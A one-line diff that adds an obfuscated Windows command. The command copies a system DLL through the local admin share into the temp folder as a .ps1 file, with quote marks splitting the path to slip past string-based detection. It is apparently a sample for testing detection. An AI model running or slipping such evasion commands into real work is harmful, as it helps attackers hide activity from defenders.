@@ -1,0 +1,1 @@
+cmd.exe /c copy \\localhost\c$\windows\sys""tem32\devmgr.dll \\localhost\c$\windows\temp\LMAKSW.ps1 /y
